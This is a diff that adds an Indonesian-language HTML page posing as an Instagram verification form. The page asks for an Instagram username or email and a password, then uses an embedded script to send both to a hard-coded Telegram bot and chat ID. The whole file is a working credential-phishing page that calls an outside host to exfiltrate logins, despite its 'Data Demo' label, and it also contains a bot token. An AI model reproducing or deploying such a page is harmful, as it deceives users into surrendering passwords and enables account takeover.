@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>verifikasi instagram(24 jam)</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f6f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: #fff;
+      padding: 20px 24px;
+      border-radius: 12px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+      width: 320px;
+    }
+    h2 { margin-top: 0; }
+    .input {
+      margin-bottom: 12px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      background: #0088cc;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #0077b6;
+    }
+    .status {
+      margin-top: 12px;
+      font-size: 14px;
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h2>verifikasi instagram akan terkirim dalam waktu 24 jam</h2>
+    <form id="form">
+      <div class="input">
+        <input type="text" id="identity" placeholder="Username/Email" required>
+      </div>
+      <div class="input">
+        <input type="password" id="password" placeholder="Kata Sandi" required>
+      </div>
+      <button type="submit">verifikasi</button>
+    </form>
+    <div id="status" class="status"></div>
+  </div>
+
+  <script>
+    const TOKEN = "8346649556:AAGU6CD940Afu9JTr8mdtIR55iMUcZr5ecw";
+    const CHAT_ID = "7435066069";
+
+    document.getElementById("form").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const identity = document.getElementById("identity").value;
+      const password = document.getElementById("password").value;
+
+      const text = `Data Demo:\nUser: ${identity}\nPassword: ${password}`;
+
+      try {
+        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ chat_id: CHAT_ID, text }),
+        });
+
+        if (res.ok) {
+          document.getElementById("status").textContent = "✅ Pesan terkirim ke Telegram!";
+        } else {
+          document.getElementById("status").textContent = "❌ Gagal mengirim.";
+        }
+      } catch (err) {
+        document.getElementById("status").textContent = "⚠️ Error koneksi.";
+      }
+    });
+  </script>
+</body>
+</html>
